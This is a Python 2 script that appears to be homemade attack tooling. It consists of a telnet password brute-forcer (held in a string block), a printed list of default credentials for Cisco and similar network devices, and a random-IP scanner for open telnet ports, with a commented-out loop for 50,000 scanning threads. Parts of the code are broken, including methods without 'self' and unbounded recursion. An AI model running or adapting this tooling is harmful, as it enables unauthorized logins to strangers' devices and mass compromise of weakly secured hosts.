import threading
import telnetlib
import sys
import socket
import random
import thread
import time
        
"""
users = []
words = []

if len(sys.argv) !=4:
	print "Usage: ./telnetbrute.py <server> <userlist> <wordlist>"
	sys.exit(1)
#----------------------------------------------------------------
try:
        userlist = open(sys.argv[2], "r").readlines()
        #userlist.close()
        for user in userlist:
                user = user.strip("\n")
                users.append(user)
except(IOError): 
  	print "Error: Check your userlist path\n"
  	sys.exit(1)
#------------------------------------------------------------------
try:
  	wordlist = open(sys.argv[3], "r").readlines()
  	#wordlist.close()
except(IOError):
  	print "Error: Check your wordlist path\n"
  	sys.exit(1)

for word in wordlist:
        words.append(word)
#---------------------------------------------------------------------

print "\t--------------------------------------------------\n"
print "[+] Server:",sys.argv[1]
print "[+] Users Loaded:",len(users)
print "[+] Words Loaded:",len(words),"\n"

#lock = threading.Lock()
#lock.acquire()
#lock.release()
print "-"*12

for user in users:
        for passwd in words:
                print "User:",user,"Password:",passwd
                try:
                        tn = telnetlib.Telnet(sys.argv[1],23,1)
                        tn.read_until((":" or ">" or "$" or "@"))
                        tn.write(user + "\n")
                        tn.read_until((":" or ">" or "$" or "@"))
                        tn.write(passwd + "\n")
                        tn.write("dir\n")
                        tn.write("exit\n")
                        tn.read_all()#we can print this to get the banner
                        print "\t\nLogin successful:", user , passwd
                        tn.close()
                        sys.exit(1)
                except Exception ,e:
                        pass

"""
dict={
"Administrator":"admin",
"|Administrator":"changeme",
"cisco":"cisco",
"admin":"admin",
"|admin":"diamond",
"||admin":"cisco",
"root":"Cisco",
"|root":"password",
"||root":"blender",
"|||root":"attack",
"bbsd-client":"changeme2",
"cmaker":"cmaker",
"cusadmin":"password",
"hsa":"hsadb",
"netrangr":"attack",
"wlse":"wlsedb",
"wlseuser":"wlseuser"
}
for key , value in dict.iteritems():
        print key.replace("|","")+"="+value
class HostFinder:
        ip_list=[]
        def randy():
            a=random.randint(1,254)
            b=random.randint(1,254)
            c=random.randint(1,254)
            d=random.randint(1,4)
            ip=str(a) + "." +str(b) + "." +str(c) + "." +str(d)
            try:
                socket.gethostbyaddr(ip)
                connect(ip)
            except Exception ,e:
                #print "Offline -> " , ip
                randy()
                pass
        def connect(host):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host,23))
                print "connectd  ----------> " + host
                #raw_input("continue Enter")
            except:
                #print  "errir " + host
                pass
            finally:
                s.close()

"""
for trys in range(1,50000):
        thread.start_new_thread(randy , ())
        time.sleep(0.5)
   """         






 
